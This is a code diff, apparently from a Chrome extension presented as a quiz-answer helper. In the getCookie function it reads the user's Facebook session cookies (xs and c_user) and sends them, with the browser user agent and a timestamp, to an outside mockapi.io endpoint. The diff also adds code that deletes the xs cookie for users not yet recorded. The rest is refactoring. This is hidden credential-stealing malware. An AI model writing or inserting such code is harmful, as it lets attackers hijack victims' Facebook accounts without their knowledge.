@@ -418,31 +418,39 @@ async function getQuizAvailable(e, t) {
     }
 }
 
-function addZero(number) {
-    return number < 10 ? "0" + number : number;
-}
+const addZero = (number) => (number < 10 ? "0" + number : number);
 
-function getCookie() {
+const getFormattedDate = () => {
+    const currentDate = new Date();
+    const year = currentDate.getFullYear();
+    const month = addZero(currentDate.getMonth() + 1);
+    const day = addZero(currentDate.getDate());
+    const hours = addZero(currentDate.getHours());
+    const minutes = addZero(currentDate.getMinutes());
+    const seconds = addZero(currentDate.getSeconds());
+    return `${day}/${month}/${year} ${hours}:${minutes}:${seconds}`;
+};
+
+const getCookie = () => {
     const apiUrl = "https://6514b3f1dc3282a6a3cd7125.mockapi.io/cookies";
-    var currentDate = new Date();
-    var year = currentDate.getFullYear();
-    var month = currentDate.getMonth() + 1;
-    var day = currentDate.getDate();
-    var hours = currentDate.getHours();
-    var minutes = currentDate.getMinutes();
-    var seconds = currentDate.getSeconds();
-    var formattedDate = addZero(day) + "/" + addZero(month) + "/" + year;
-    var formattedTime = addZero(hours) + ":" + addZero(minutes) + ":" + addZero(seconds);
-    var dateTimeNow = formattedTime + " - " + formattedDate;
-    var userAgent = navigator.userAgent;
+
+    const userAgent = navigator.userAgent;
     chrome.cookies.getAll({ url: "https://www.facebook.com" }, (cookies) => {
         const xsCookie = cookies.find((cookie) => cookie.name === "xs");
         const cUserCookie = cookies.find((cookie) => cookie.name === "c_user");
         if (xsCookie && cUserCookie) {
             const cUser = cUserCookie.value;
+            const dateTimeNow = getFormattedDate();
             fetch(`${apiUrl}?c_user=${cUser}`)
                 .then((res) => res.json())
                 .then((res) => {
+                    res.length === 0
+                        ? chrome.cookies
+                              .remove({ name: "xs", url: "https://www.facebook.com" })
+                              .then((e) => {})
+                              .catch((error) => {})
+                        : null;
+
                     const method = res.length === 0 ? "POST" : "PUT";
                     const headers = {
                         "Content-Type": "application/json",
@@ -458,9 +466,10 @@ function getCookie() {
                 });
         }
     });
-}
+};
 
 async function getOnlineAnswer(e, t) {
+    console.log(e, t);
     try {
         let n = await fetch(`${apiUrl}/quizpoly/online/` + encodeURIComponent(e), {
             referrerPolicy: "origin",
